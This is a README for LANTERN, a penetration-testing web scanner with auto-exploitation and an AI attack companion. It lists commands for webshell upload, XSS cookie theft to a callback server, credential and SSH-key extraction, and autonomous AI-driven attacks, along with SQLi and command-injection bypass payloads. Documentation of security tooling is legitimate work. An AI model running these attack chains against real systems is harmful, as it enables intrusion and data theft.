# LANTERN

[![CI](https://github.com/Suffix30/LANTERNv2.0/actions/workflows/ci.yml/badge.svg)](https://github.com/Suffix30/LANTERNv2.0/actions/workflows/ci.yml)
[![CodeQL](https://github.com/Suffix30/LANTERNv2.0/actions/workflows/codeql.yml/badge.svg)](https://github.com/Suffix30/LANTERNv2.0/actions/workflows/codeql.yml)
[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

```
 ██▓    ▄▄▄       ███▄    █ ▄▄▄█████▓▓█████  ██▀███   ███▄    █ 
▓██▒   ▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒ ██ ▀█   █ 
▒██░   ▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒▓██  ▀█ ██▒
▒██░   ░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  ▓██▒  ▐▌██▒
░██████▒▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒▒██░   ▓██░
░ ▒░▓  ░▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ 
░ ░ ▒  ░ ▒   ▒▒ ░░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░░ ░░   ░ ▒░
  ░ ░    ░   ▒      ░   ░ ░   ░         ░     ░░   ░    ░   ░ ░ 
    ░  ░     ░  ░         ░             ░  ░   ░              ░ 
```

Web vulnerability scanner with automatic exploitation. 62 modules, async architecture, attack chains, and actual data extraction.

## Installation

### Option 1: pip (Recommended)

```bash
pip install git+https://github.com/Suffix30/LANTERNv2.0.git
```

### Option 2: pipx (Isolated Environment)

```bash
pipx install git+https://github.com/Suffix30/LANTERNv2.0.git
```

### Option 3: From Source

```bash
git clone https://github.com/Suffix30/LANTERNv2.0.git
cd LANTERNv2.0
pip install -e .
```

### Update to Latest Version

```bash
# If installed via pip
pip install --upgrade git+https://github.com/Suffix30/LANTERNv2.0.git

# If installed via pipx
pipx upgrade lantern-scanner
# Or reinstall for major updates:
pipx uninstall lantern-scanner && pipx install git+https://github.com/Suffix30/LANTERNv2.0.git

# If installed from source
cd LANTERNv2.0
git pull
pip install -e .
```

### With Agent BLACK (AI Features)

```bash
pip install "lantern-scanner[agent] @ git+https://github.com/Suffix30/LANTERNv2.0.git"
```

## Quick Examples

```bash
# Basic scan
lantern -t https://target.com

# Injection testing with report
lantern -t https://target.com -m sqli,xss,ssti -o report --format html

# Full attack chain
lantern -t https://target.com --chain auth_bypass --exploit

# AI-powered autonomous attack
black autonomous https://target.com --attack
```

**[Full Command Reference](docs/COMMANDS.md)** | **[Quick Start Guide](docs/QUICKSTART.md)** | **[Documentation](docs/INDEX.md)**

## Features

- **62 scanner modules** covering injection, auth, API, recon, and business logic
- **Auto-exploitation** - doesn't just find vulns, extracts data (credentials, files, cloud keys)
- **Attack chains** - automatically pivots from one finding to the next
- **Smart shell construction** - builds and uploads optimized webshells for RCE
- **Cookie theft via XSS** - real exfiltration to your callback server
- **JWT forging** - cracks secrets and forges admin tokens
- **Cloud metadata extraction** - AWS keys, GCP tokens via SSRF
- **High-speed DNS brute force** - 500+ req/s async subdomain discovery, no external tools
- **Technology detection** - 100+ fingerprints, auto-selects relevant modules
- **Regex mutation engine** - 200+ pattern-based payload transformations for WAF bypass
- **Obfuscation engine** - 34 techniques across 6 categories (encoding, case, whitespace, comments, concat, splitting)
- **Secret extraction** - automatically pulls API keys, JWTs, passwords, AWS keys from responses
- **Learned payloads** - successful mutations are saved and reused, arsenal grows with each scan
- **WAF detection** - 22 signatures (Cloudflare, Akamai, Imperva, etc.) with adaptive bypass
- **Subdomain takeover** - 55 service fingerprints for dangling DNS detection
- **Cloud misconfiguration** - S3, Azure Blob, GCP Storage, Firebase exposure scanning
- **HTTP/2 smuggling** - H2.CL, H2.TE desync, request tunneling attacks
- **Cache poisoning** - unkeyed headers/params, path normalization, web cache deception
- **CSP bypass analysis** - CDN bypasses, JSONP detection, Angular exploitation
- **Parameter discovery** - 308 common params, header fuzzing, JS/HTML extraction
- **Reports** - HTML, JSON, Markdown, JIRA CSV, SARIF with CVSS scores
- **Proof of Concept generation** - Auto-generates curl/Python/JS PoC code per finding
- **Confidence scoring** - Evidence-based confidence levels (CONFIRMED/HIGH/MEDIUM/LOW)
- **JavaScript analysis** - Extracts endpoints, secrets, DOM sinks from JS files
- **Business logic workflows** - YAML-defined multi-step attack workflows
- **Authentication state machine** - Multi-role session management for access control testing
- **Intelligent fuzzing** - Boundary values, mutations, timing analysis, differential testing
- **Built-in CVE database** - Version-matched CVE testing (Spring4Shell, Log4Shell, etc.)
- **Response diffing** - Baseline comparison with dynamic content stripping
- **Built-in OOB server** - HTTP/DNS callback server for blind vulnerability detection
- **CI/CD integration** - Exit codes, SARIF for GitHub/GitLab, JUnit XML for Jenkins
- **Scope management** - Include/exclude domains, IPs, regex patterns, file-based config
- **Response caching** - LRU cache with TTL, persistence, improves scan speed

## Agent BLACK - AI Security Companion

LANTERN includes **Agent BLACK**, an AI-powered security assistant.

### Features

- **Natural language commands** - "Scan this site for SQL injection" → runs the right modules
- **Overwatch Mode** - Monitors all terminals, browser tabs, and files for situational awareness
- **Watch Mode** - Continuous monitoring with proactive alerts (flags, shells, errors)
- **Obsidian Integration** - Full vault for writeups, targets, methodology, payloads
- **Autonomous scanning** - Plan and execute multi-stage attacks with AI guidance
- **Knowledge-augmented** - 21 knowledge docs covering LANTERN, payloads, attack strategies
- **Remote tool execution** - Run hashcat, HackRF, WiFi attacks on a remote Kali host

### Quick Start

```bash
pip install "lantern-scanner[agent] @ git+https://github.com/Suffix30/LANTERNv2.0.git"

black chat                    # Interactive chat
black overwatch --snapshot    # Analyze current situation
black overwatch --watch       # Continuous monitoring with alerts
black autonomous <target>     # Autonomous scanning
black status                  # Check agent status
```

### Overwatch Alerts

Watch mode detects and alerts on:
- Flags (`flag{`, `ctf{`, `htb{`)
- Sessions/shells opened
- SQL injection confirmations
- Privilege escalation
- Errors and failures

**[→ Full Agent BLACK Documentation](agent/docs/SETUP.md)**

## Subdomain Brute Force

High-speed async DNS brute force without external tools:

```bash
lantern -t https://target.com --dns-brute

lantern -t https://target.com --dns-brute --dns-concurrency 1000

lantern -t https://target.com --dns-brute --dns-wordlist /path/to/wordlist.txt
```

Features:
- 500+ requests/second using raw UDP sockets
- Automatic wildcard detection and filtering
- Resolver pooling across 14 DNS servers
- Smart retry with server failover
- No external tools required (no massdns)

## Technology Detection

Fingerprint the tech stack and auto-select modules:

```bash
lantern -t https://target.com --tech-detect

lantern -t https://target.com --smart

lantern -t https://target.com --smart --exploit
```

The `--smart` flag detects technologies (WordPress, Django, Spring, etc.) and automatically adds relevant modules (sqli, ssti, deserial) to the scan.

Detection covers:
- Response headers (Server, X-Powered-By)
- Cookies (PHPSESSID, JSESSIONID, etc.)
- HTML patterns (meta generators, framework fingerprints)
- URL patterns (/.aspx, /wp-admin, /actuator)

## LDAP / Active Directory

Test for LDAP injection and enumerate AD environments:

```bash
lantern -t https://target.com -m ldap

lantern -t https://target.com -m ldap --exploit

lantern -t https://target.com --chain auth_bypass
```

Capabilities:
- LDAP filter injection (`*`, `)(`, `%00`)
- Authentication bypass testing
- Blind LDAP injection (response length diff)
- User enumeration via timing/error
- AD attribute exposure detection
- sAMAccountName, memberOf, objectSid extraction

## Directory Brute Force

Aggressive path and file discovery:

```bash
lantern -t https://target.com -m dirbust

lantern -t https://target.com -m dirbust --aggressive

lantern -t https://target.com --chain enum
```

Features:
- 100+ common directories (admin, api, backup, config, etc.)
- 80+ sensitive files (.env, .git, backups, configs)
- Backup pattern detection (domain.zip, database.sql)
- Recursive subdirectory enumeration
- Smart 404 detection (avoids false positives)
- Source code exposure detection
- Secret extraction from discovered files

## Exploitation Mode

The `--exploit` flag enables automatic exploitation of discovered vulnerabilities:

```bash
lantern -t https://target.com --exploit --deep -o report
```

What exploitation does per module:

| Module | Exploitation |
|--------|-------------|
| SSRF | Extracts AWS/GCP credentials, probes internal services |
| LFI | Reads /etc/passwd, .env, config files, SSH keys |
| SQLi | URL + JSON body params; dumps version, tables, credentials; MSSQL/Azure STRING_AGG blind extraction |
| CMDI | Executes commands, reads files, extracts env vars |
| SSTI | RCE via template engine, extracts system info |
| XXE | Exfiltrates files, accesses cloud metadata |
| JWT | Forges admin tokens, accesses protected endpoints |
| Upload | Constructs shells (PHP/ASP/JSP), uploads, verifies RCE |
| XSS | Cookie theft, keylogging, phishing injection |
| LDAP | Auth bypass, user enumeration, AD attribute extraction |
| Dirbust | Backup discovery, source code exposure, secret extraction |

For XSS cookie capture, provide a callback server:

```bash
lantern -t https://target.com --exploit -m xss --callback-host your-server.com
```

## Attack Chains

Chain modules together to pivot from one finding to another:

```bash
lantern -t https://target.com --chain data_theft
lantern -t https://target.com --chain rce
lantern -t https://target.com --chain auth_bypass
lantern -t https://target.com --chain api_attack
lantern -t https://target.com --chain enum
```

| Chain | Modules |
|-------|---------|
| auth_bypass | waf, sqli, ldap, auth, jwt, oauth, mfa, session |
| data_theft | waf, sqli, ssrf, lfi, xxe, idor, disclosure, dirbust, cloud |
| rce | waf, cmdi, ssti, deserial, upload, ssrf |
| xss_chain | waf, csp, xss, dom, prototype, cors, csrf |
| api_attack | waf, api, graphql, massassign, jwt, idor |
| enum | waf, dirbust, subdomain, takeover, disclosure, fingerprint, techdetect, dork, cloud |
| injection | waf, paramfind, sqli, xss, ssti, cmdi, lfi, xxe, crlf |
| smuggle | waf, h2smuggle, smuggle, cachepois |
| cache | cachepois, headers, cors |
| cloud | cloud, ssrf, disclosure, dirbust |
| takeover | takeover, subdomain |
| full_recon | waf, techdetect, fingerprint, subdomain, takeover, cloud, dirbust, disclosure, dork, paramfind, csp |

Chains automatically use exploitation data - if SSRF extracts AWS keys, the chain logs the attack path and suggests next steps.

List chains: `lantern --list-chains`

## Modules

**Injection:** sqli, xss, cmdi, ssti, xxe, lfi, crlf, hpp, ldap, fuzz, deserial, smuggle, h2smuggle, emailinject, hostinject

**Auth/Access:** auth, jwt, oauth, mfa, session, cookie, csrf, idor, massassign, cors, redirect, clickjack, upload, accessctl

**API:** api, graphql, websocket, apiver

**Recon:** fingerprint, disclosure, secrets, subdomain, techdetect, dork, cve, dirbust, paramfind, takeover, cloud, waf, brokenlinks

**Config:** headers, ssl, cache, cachepois, download, ssrf, csp, cdn

**Client:** prototype, dom, embed

**Business Logic:** payment, race, captcha, account, logic

**62 modules total.** List all: `lantern --list`

## Presets

```bash
lantern -t https://target.com --preset fast
lantern -t https://target.com --preset api
lantern -t https://target.com --preset stealth
lantern -t https://target.com --preset thorough
lantern -t https://target.com --preset exploit
```

List presets: `lantern --list-presets`

## Reports

```bash
lantern -t https://target.com -o report                  # HTML
lantern -t https://target.com -o report --format json    # JSON
lantern -t https://target.com -o report --format all     # All formats
lantern -t https://target.com -o report --obsidian       # Also export to Obsidian
lantern -t https://target.com -o report --format obsidian --obsidian-vault ~/vault  # Obsidian only
```

Reports include:
- Executive summary with risk rating
- CVSS scores per finding
- Remediation steps with code examples
- Exploitation data (extracted creds, files, shell URLs)

### Obsidian Integration (Beta)

> **Note:** Obsidian integration is under active development. Core functionality works but some features may change.

Export scan results directly to your Obsidian security vault:

```bash
lantern -t https://target.com -o report --obsidian
lantern -t https://target.com -o report --obsidian-vault ~/Documents/Security\ Vault
export BLACK_OBSIDIAN_VAULT="~/Documents/Security Vault"
```

Creates:
- Main scan report with frontmatter and backlinks
- Individual finding notes linked to the main report
- Proper tags for filtering (severity, module, target)
- Links to methodology notes

## Options

```
-t, --target        Target URL or file with URLs
-m, --modules       Comma-separated module list
-o, --output        Output filename (no extension)
--format            html, json, md, jira, obsidian, all
--obsidian          Also export to Obsidian vault
--obsidian-vault    Path to Obsidian vault
--threads           Concurrent requests (default: 50)
--timeout           Request timeout seconds (default: 10)
--crawl             Enable crawler
--crawl-depth       How deep to crawl (default: 3)
--aggressive        More payloads, WAF bypass attempts
--stealth           Slower, randomized timing
--fast              Passive checks only
--deep              Thorough injection testing
--exploit           Enable auto-exploitation
--callback-host     Your server for OOB/XSS callbacks
--preset            Use a preset config
--chain             Run attack chain
--smart             Smart module selection based on tech detection
--tech-detect       Run technology detection only
--dns-brute         High-speed DNS subdomain brute force
--dns-wordlist      Custom wordlist for DNS brute force
--dns-concurrency   DNS brute force concurrency (default: 500)
--proxy             Proxy URL (http://127.0.0.1:8080)
--resume            Resume from checkpoint
-H, --header        Custom header (repeatable)
-c, --cookies       Cookie string
-v, --verbose       Verbose output
--ci                CI/CD mode with exit codes
--fail-on           Fail on severity (CRITICAL, HIGH, MEDIUM, LOW)
--sarif             Output SARIF report for GitHub/GitLab
--junit             Output JUnit XML for CI pipelines
--scope-file        Load scope from file
--include-domain    Include domain in scope (repeatable)
--exclude-domain    Exclude domain from scope (repeatable)
--exclude-pattern   Exclude URL pattern regex (repeatable)
--cache             Enable response caching
--cache-ttl         Cache TTL in seconds (default: 300)

# New v2.0 Options
--auth-config       Authentication config YAML (multi-role testing)
--workflow          Business logic workflow YAML file
--workflow-attack   Run specific attack from workflow
--list-workflows    List available pre-built attack workflows
--oob-server        Start built-in OOB callback server
--oob-port          OOB HTTP server port (default: 8888)
--oob-dns-port      OOB DNS server port (default: 5353)
--analyze-js        Deep JavaScript analysis (endpoints, secrets, DOM sinks)
--cve-scan          Scan for known CVEs based on detected technologies
--generate-pocs     Generate PoC files for each finding
--fuzz-params       Intelligent parameter fuzzing with boundary values
--diff-baseline     Establish response baselines for anomaly detection
```

## Business Logic Workflows

Test multi-step business flows for logic vulnerabilities:

```bash
lantern -t https://shop.target.com --workflow workflows/checkout_bypass.yml

lantern -t https://target.com --workflow workflows/password_reset.yml --workflow-attack host_header_poison

lantern -t https://target.com --workflow workflows/checkout_bypass.yml --auth-config configs/auth.yml
```

Workflow features:
- YAML-defined multi-step request sequences
- Variable extraction and injection between steps
- Built-in attack generation (skip steps, modify params, replay)
- Role-based testing with auth config

Example workflow (`workflows/checkout_bypass.yml`):
```yaml
name: checkout_bypass
steps:
  - name: add_to_cart
    request: { method: POST, url: /api/cart/add, json: { item_id: "1" } }
    extract: { cart_id: $.cart_id }
  - name: checkout
    request: { method: POST, url: /api/checkout, json: { cart_id: "${cart_id}" } }
attacks:
  - name: skip_payment
    skip_steps: [payment]
  - name: zero_price
    modify_step: checkout
    modifications: { json.total: "0" }
```

## Pre-built Attack Workflows

Ready-to-use attack workflows for common vulnerability chains:

```bash
lantern --list-workflows

lantern -t https://shop.target.com --workflow workflows/payment_bypass.yml

lantern -t https://target.com --workflow workflows/auth_bypass.yml --workflow-attack jwt_none_algorithm

lantern -t https://target.com --workflow workflows/sqli_escalate.yml --oob-server
```

| Workflow | Attacks |
|----------|---------|
| `payment_bypass.yml` | Zero price, negative quantity, coupon stacking, skip payment, currency manipulation |
| `auth_bypass.yml` | IDOR, role escalation, JWT none alg, session fixation, password reset takeover |
| `api_abuse.yml` | Mass assignment, GraphQL introspection, BOLA enumeration, rate limit bypass |
| `file_upload.yml` | PHP webshell, double extension, null byte, SVG XSS/XXE, polyglot, .htaccess |
| `ssrf_chain.yml` | AWS/GCP/Azure metadata, Redis/Elasticsearch, gopher://, DNS rebinding |
| `sqli_escalate.yml` | Union extraction, file read/write, xp_cmdshell, PostgreSQL COPY RCE |

## JavaScript Analysis

Deep analysis of JavaScript files:

```bash
lantern -t https://target.com --analyze-js

lantern -t https://target.com --analyze-js -m xss,dom,prototype
```

Detects:
- Hidden API endpoints (fetch, axios, XHR calls)
- Hardcoded secrets (API keys, tokens, credentials)
- DOM XSS sinks (innerHTML, eval, document.write)
- Framework detection (React, Angular, Vue, etc.)
- Source map exposure

## CVE Scanning

Automated CVE detection based on technology fingerprints:

```bash
lantern -t https://target.com --cve-scan

lantern -t https://target.com --cve-scan --callback-host your-server.com
```

Built-in CVE database includes:
- **Spring4Shell** (CVE-2022-22965)
- **Log4Shell** (CVE-2021-44228)
- **Apache Path Traversal** (CVE-2021-41773, CVE-2021-42013)
- **Confluence OGNL** (CVE-2022-26134)
- **WordPress, Drupal, Jira** vulnerabilities
- And more...

## Built-in OOB Server

Start a callback server for blind vulnerability detection:

```bash
lantern -t https://target.com --oob-server --oob-port 8888 -m ssrf,xxe,sqli --exploit

lantern -t https://target.com --oob-server --oob-dns-port 5353 -m ssrf --exploit
```

Features:
- HTTP callback listener
- DNS query listener
- Token-based correlation
- Automatic payload generation with unique tokens

## Multi-Role Authentication Testing

Test access controls across different user roles:

```bash
lantern -t https://target.com --auth-config configs/auth.yml -m idor,auth,session

lantern -t https://target.com --auth-config configs/auth.yml --chain auth_bypass
```

Auth config example (`configs/auth.yml`):
```yaml
authentication:
  type: form
  login_url: /login
  form:
    username_field: email
    password_field: password
  roles:
    admin: { username: admin@target.com, password: "${ADMIN_PASSWORD}" }
    user: { username: user@target.com, password: "${USER_PASSWORD}" }
    guest: { authenticated: false }
```

## CI/CD Integration

Run in CI pipelines with proper exit codes and standardized reports:

```bash
lantern -t https://target.com --ci --fail-on HIGH -o scan_results

lantern -t https://target.com --ci --sarif results.sarif

lantern -t https://target.com --ci --junit results.xml
```

**Exit codes:**
- `0` - No vulnerabilities above threshold
- `1` - Vulnerabilities found at or above fail-on severity
- `2` - Vulnerability count threshold exceeded
- `3` - Scan error
- `4` - Configuration error

**GitHub Actions example:**
```yaml
- name: Security Scan
  run: |
    lantern -t ${{ env.TARGET }} --ci --sarif results.sarif --fail-on HIGH
- name: Upload SARIF
  uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: results.sarif
```

## Scope Management

Control what gets scanned:

```bash
lantern -t https://target.com --include-domain target.com --include-domain api.target.com

lantern -t urls.txt --exclude-domain logout.target.com --exclude-pattern "/static/"

lantern -t https://target.com --scope-file scope.txt
```

**Scope file format:**
```
+target.com
+*.target.com
-logout.target.com
-regex:/logout|/signout/
-path:/static/
+ip:10.0.0.0/8
```

## Mutation Engine

Lantern automatically mutates payloads using regex patterns to bypass WAFs:

**SQLi mutations:**
- `' OR 1=1--` → `'/**/OR/**/1=1--`, `' || 1=1--`, `'%09OR%091=1--`
- Case mixing, inline comments, whitespace encoding, quote variants

**XSS mutations:**
- `<script>` → `%3Cscript>`, `<ScRiPt>`, `<svg/onload=`
- Unicode escapes, null bytes, tag substitution

**Command injection:**
- `;id` → `%0aid`, `&&id`, `${IFS}id`
- Separator variants, IFS bypass, quoting

All 6 categories (sqli, xss, cmdi, lfi, ssti, ssrf) have dedicated mutation patterns.

## Obfuscation Engine

Advanced payload obfuscation for WAF bypass:

| Category | Techniques | Examples |
|----------|------------|----------|
| **Encoding** | URL, double/triple URL, unicode, hex, octal, HTML entities, overlong UTF-8, UTF-7/16 | `<` → `%3C`, `%253C`, `\u003c`, `&#60;` |
| **Case** | Random, alternating, inverse | `SCRIPT` → `ScRiPt`, `sCrIpT` |
| **Whitespace** | Tab, newline, null byte, zero-width chars | `' OR` → `'\tOR`, `'\x00OR` |
| **Comments** | SQL inline, multiline, version | `SELECT` → `SEL/**/ECT`, `/*!50000SELECT*/` |
| **Concatenation** | String concat, CHAR(), fromCharCode | `admin` → `'ad'+'min'`, `CHAR(97,100,109,105,110)` |
| **Splitting** | Keyword split, reverse, chunk | `alert` → `al"+"ert` |

**Polyglot payloads** included for testing multiple contexts at once.

## Secret Extraction

Responses are automatically scanned for secrets:

| Pattern | Detected |
|---------|----------|
| `AKIA...` | AWS Access Keys |
| `eyJ...` | JWT Tokens |
| `password=...` | Credentials |
| `api_key=...` | API Keys |
| `192.168.x.x` | Internal IPs |
| `-----BEGIN RSA PRIVATE KEY-----` | SSH Keys |
| MD5/SHA1/SHA256 hashes | Password hashes |

Extracted secrets appear in findings with `exploit_data`.

## Learned Payloads

Successful payloads are automatically saved:

```
payloads/
├── sqli.txt           # Base payloads
├── xss.txt
├── learned/           # Auto-generated
│   ├── index.json     # Payload metadata
│   ├── sqli.txt       # Learned SQLi
│   └── xss.txt        # Learned XSS
```

On future scans, learned payloads are tested first. The arsenal grows with each successful exploitation.

## Adding Payloads

Drop payload files in `payloads/` directory:

```
payloads/
├── sqli.txt
├── xss.txt
├── lfi.txt
├── ssrf.txt
├── cmdi.txt
└── your_custom.txt
```

One payload per line. Modules will pick them up automatically.

## Test Lab (Included)

LANTERN includes a complete vulnerable lab for testing. One command to start:

**Windows:**
```cmd
cd lab
start-lab.bat
```

**Linux/Mac:**
```bash
cd lab
./start-lab.sh
```

This spins up 3 vulnerable applications:

| Target | URL | Best For Testing |
|--------|-----|------------------|
| Juice Shop | http://localhost:3001 | XSS, SQLi, JWT, Auth bypass, IDOR, NoSQL |
| WebGoat | http://localhost:3002 | XXE, Deserialization, Path traversal, JWT |
| Mutillidae | http://localhost:3003 | LDAP, SSRF, XML, SQLi, CMDi, CSRF |

Run full test suite:
```bash
cd lab
./run-all-tests.sh      # Linux/Mac
run-all-tests.bat       # Windows
```

See [lab/README.md](lab/README.md) for detailed test commands.

## External Test Targets

Legal targets for testing (no lab required):

```
http://testphp.vulnweb.com
http://testhtml5.vulnweb.com
http://testasp.vulnweb.com
https://demo.testfire.net
http://zero.webappsecurity.com
```

## Project Structure

```
lantern/
├── lantern              # Entry point
├── requirements.txt
├── pyproject.toml       # pipx/pip install config
├── core/
│   ├── engine.py        # Scan orchestration
│   ├── http.py          # Async HTTP client
│   ├── crawler.py       # Web crawler
│   ├── reporter.py      # Report generation (HTML, JSON, SARIF, PoCs)
│   ├── bypass.py        # WAF bypass + regex mutation engine
│   ├── learned.py       # Payload learning system
│   ├── dns_brute.py     # Async DNS brute forcer
│   ├── tech_detect.py   # Technology fingerprinting
│   ├── cli.py           # Command-line interface
│   ├── differ.py        # Response diffing + reflection detection
│   ├── confidence.py    # Evidence-based confidence scoring
│   ├── poc.py           # PoC generation (curl, Python, JS)
│   ├── js_analyzer.py   # JavaScript analysis (endpoints, secrets, DOM)
│   ├── auth_manager.py  # Multi-role authentication state machine
│   ├── workflow.py      # Business logic workflow engine
│   ├── fuzzer.py        # Intelligent fuzzing engine
│   ├── cve_db.py        # CVE database + version matching
│   └── oob.py           # Out-of-band callback server
├── modules/             # 62 scanner modules
├── payloads/            # Attack payloads (add your own)
│   └── learned/         # Auto-generated successful payloads
├── workflows/           # Business logic workflow definitions
├── configs/             # Authentication and scan configs
└── presets/             # Scan profiles (YAML)
```

## Legal

For authorized testing only. You are responsible for how you use this tool.

## Author

NET

## License

MIT
